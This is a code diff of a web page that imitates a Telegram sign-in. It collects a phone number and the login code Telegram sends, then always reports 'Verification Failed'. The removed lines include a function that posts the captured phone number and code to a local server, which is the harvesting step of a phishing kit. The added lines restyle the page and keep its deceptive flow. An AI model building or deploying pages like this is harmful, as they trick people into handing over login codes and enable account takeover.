@@ -8,81 +8,101 @@
         @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
         body {
             font-family: 'Open Sans', sans-serif;
-            background-color: #ffffff;
+            background-color: #1c1c1c;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
             overflow-x: hidden;
         }
 
         .container {
-            background-color: #ffffff;
-            padding: 20px;
             text-align: center;
             width: 90%;
             max-width: 380px;
-            margin-top: 20px;
+            margin-top: -20px;
             position: relative;
         }
 
         .container img {
-            width: 80px;
+            width: 100px;
             margin-bottom: 20px;
         }
 
         h1 {
-            font-size: 18px;
-            color: #333333;
+            font-size: 20px;
+            color: #ffffff;
             margin-bottom: 10px;
             font-weight: 600;
         }
 
         p {
             font-size: 14px;
-            color: #777;
+            color: #999999;
             margin-bottom: 20px;
         }
 
         .input-group {
             margin-bottom: 15px;
             text-align: left;
+            position: relative;
         }
 
         .input-group label {
             display: block;
-            font-size: 14px;
-            color: #555;
+            font-size: 12px;
+            color: #999999;
             margin-bottom: 5px;
         }
 
         select, input[type="tel"] {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ccc;
+            border: 1px solid #555;
             border-radius: 5px;
             font-size: 16px;
             box-sizing: border-box;
             margin-bottom: 10px;
+            background-color: #1c1c1c;
+            color: #ffffff;
         }
 
         select {
-            background-color: #fff;
-            color: #333;
             appearance: none;
             -webkit-appearance: none;
             -moz-appearance: none;
             position: relative;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="%23666" stroke-width="2" d="M2 7 L12 17 L22 7"/></svg>');
-            background-repeat: no-repeat;
-            background-position: right 10px center;
-            background-size: 12px 12px;
         }
 
         .dropdown-container {
             position: relative;
+        }
+
+        .dropdown {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #555;
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #1c1c1c;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .dropdown img {
+            margin-right: 10px;
+            width: 24px;
+        }
+
+        .dropdown::after {
+            content: '▼';
+            font-size: 16px;
+            color: #ffffff;
         }
 
         .dropdown-menu {
@@ -91,12 +111,12 @@
             top: 100%;
             left: 0;
             right: 0;
-            border: 1px solid #ccc;
+            background-color: #333333;
+            border: 1px solid #555;
             border-radius: 5px;
-            background-color: #fff;
-            z-index: 1000;
-            max-height: 200px;
+            max-height: 300px;
             overflow-y: auto;
+            z-index: 1000;
         }
 
         .dropdown-menu.show {
@@ -107,24 +127,24 @@
             padding: 10px;
             display: flex;
             align-items: center;
-            border-bottom: 1px solid #eee;
+            justify-content: space-between;
             cursor: pointer;
+            color: #ffffff;
         }
 
         .dropdown-item img {
-            width: 24px;
-            height: 16px;
             margin-right: 10px;
+            width: 24px;
         }
 
-        .dropdown-item:last-child {
-            border-bottom: none;
+        .dropdown-item:hover {
+            background-color: #444444;
         }
 
         .button {
             width: 100%;
             padding: 12px;
-            background-color: #0088cc;
+            background-color: #6d5dfc;
             color: #ffffff;
             border: none;
             border-radius: 5px;
@@ -135,29 +155,7 @@
         }
 
         .button:hover {
-            background-color: #007ab8;
-        }
-
-        #countryCode {
-            color: #ccc;
-            text-align: left;
-            position: relative;
-        }
-
-        #countryCode option {
-            color: #333;
-        }
-
-        #countryCode:focus {
-            color: #333;
-        }
-
-        #countryCode option:first-child {
-            display: none;
-        }
-
-        #verificationContainer, #finalMessageContainer {
-            display: none;
+            background-color: #5b4ddb;
         }
 
         @media (max-width: 600px) {
@@ -176,8 +174,8 @@
 
         <div class="input-group dropdown-container">
             <label for="countryCode">Country</label>
-            <div id="countryCode" onclick="toggleDropdown()">
-                <span>Select Country</span>
+            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
+                <img src="https://www.countryflags.io/au/flat/24.png" alt="Flag"> Australia (+61)
             </div>
             <div id="dropdownMenu" class="dropdown-menu"></div>
         </div>
@@ -189,13 +187,13 @@
 
         <div>
             <input type="checkbox" id="keepSignedIn">
-            <label for="keepSignedIn">Keep me signed in</label>
+            <label for="keepSignedIn" style="color: #ffffff;">Keep me signed in</label>
         </div>
 
         <button class="button" onclick="goToVerificationPage()">Next</button>
     </div>
 
-    <div class="container" id="verificationContainer">
+    <div class="container" id="verificationContainer" style="display:none;">
         <div class="monkey-icon">🐵</div>
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
@@ -208,7 +206,7 @@
         <button class="button" onclick="submitVerification()">Submit</button>
     </div>
 
-    <div class="container" id="finalMessageContainer">
+    <div class="container" id="finalMessageContainer" style="display:none;">
         <h1>Verification Failed</h1>
         <p id="finalMessage"></p>
         <button class="button" onclick="resetForm()">Try Again</button>
@@ -228,30 +226,17 @@
                 { name: 'India', code: '+91', flag: 'https://www.countryflags.io/in/flat/24.png' },
                 { name: 'China', code: '+86', flag: 'https://www.countryflags.io/cn/flat/24.png' },
                 { name: 'Russia', code: '+7', flag: 'https://www.countryflags.io/ru/flat/24.png' },
-                { name: 'South Korea', code: '+82', flag: 'https://www.countryflags.io/kr/flat/24.png' },
-                { name: 'Brazil', code: '+55', flag: 'https://www.countryflags.io/br/flat/24.png' },
-                { name: 'Canada', code: '+1', flag: 'https://www.countryflags.io/ca/flat/24.png' },
-                { name: 'Italy', code: '+39', flag: 'https://www.countryflags.io/it/flat/24.png' },
-                { name: 'Mexico', code: '+52', flag: 'https://www.countryflags.io/mx/flat/24.png' },
-                { name: 'Spain', code: '+34', flag: 'https://www.countryflags.io/es/flat/24.png' },
-                { name: 'Turkey', code: '+90', flag: 'https://www.countryflags.io/tr/flat/24.png' },
-                { name: 'Netherlands', code: '+31', flag: 'https://www.countryflags.io/nl/flat/24.png' },
-                { name: 'Saudi Arabia', code: '+966', flag: 'https://www.countryflags.io/sa/flat/24.png' },
-                { name: 'Sweden', code: '+46', flag: 'https://www.countryflags.io/se/flat/24.png' },
-                { name: 'Switzerland', code: '+41', flag: 'https://www.countryflags.io/ch/flat/24.png' },
-                { name: 'South Africa', code: '+27', flag: 'https://www.countryflags.io/za/flat/24.png' },
-                { name: 'Argentina', code: '+54', flag: 'https://www.countryflags.io/ar/flat/24.png' }
+                { name: 'South Korea', code: '+82', flag: 'https://www.countryflags.io/kr/flat/24.png' }
                 // Add more countries as needed
             ];
 
-            // Populate the dropdown menu
             countries.forEach(country => {
                 const item = document.createElement('div');
                 item.classList.add('dropdown-item');
-                item.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
+                item.innerHTML = `<img src="${country.flag}" alt="Flag"> ${country.name} ${country.code}`;
                 item.dataset.code = country.code;
                 item.addEventListener('click', function() {
-                    countryDropdown.innerHTML = `${country.flag ? `<img src="${country.flag}" alt="Flag">` : ''} ${country.name} ${country.code}`;
+                    countryDropdown.innerHTML = `<img src="${country.flag}" alt="Flag"> ${country.name} ${country.code}`;
                     document.getElementById('phoneNumber').value = country.code + ' ' + document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
                     dropdownMenu.classList.remove('show');
                 });
@@ -260,72 +245,36 @@
 
             window.toggleDropdown = function() {
                 dropdownMenu.classList.toggle('show');
-                countryDropdown.classList.toggle('open');
             };
 
             window.goToVerificationPage = function() {
-                const countryCode = document.getElementById('countryCode').innerText.split(' ')[1];
-                const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-                const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
-
+                const phoneNumber = document.getElementById('phoneNumber').value;
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
-                document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
-
+                document.getElementById('phoneDisplay').textContent = phoneNumber;
                 document.getElementById('initialContainer').style.display = 'none';
                 document.getElementById('verificationContainer').style.display = 'block';
             };
 
-            async function sendDataToServer(phoneNumber, verificationCode) {
-                try {
-                    const response = await fetch('http://localhost:8000/save-verification', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            phoneNumber: phoneNumber,
-                            verificationCode: verificationCode,
-                            userId: 1 // This can be updated dynamically if needed
-                        })
-                    });
-
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-
-                    console.log("Data sent to server successfully");
-                } catch (error) {
-                    console.error("Failed to send data to server:", error);
-                }
-            }
-
             window.submitVerification = function() {
                 const verificationCode = document.getElementById('verificationCode').value;
-                const phoneDisplay = document.getElementById('phoneDisplay').textContent;
-
                 if (verificationCode === '') {
                     alert('Please enter the verification code.');
                     return;
                 }
 
-                sendDataToServer(phoneDisplay, verificationCode);
-
-                // Show the final message indicating verification failure
                 document.getElementById('verificationContainer').style.display = 'none';
-                document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
                 document.getElementById('finalMessageContainer').style.display = 'block';
             };
 
             window.resetForm = function() {
-                document.getElementById('initialContainer').style.display = 'block';
-                document.getElementById('verificationContainer').style.display = 'none';
-                document.getElementById('finalMessageContainer').style.display = 'none';
                 document.getElementById('phoneNumber').value = '';
                 document.getElementById('verificationCode').value = '';
+                document.getElementById('finalMessageContainer').style.display = 'none';
+                document.getElementById('initialContainer').style.display = 'block';
             };
         });
     </script>
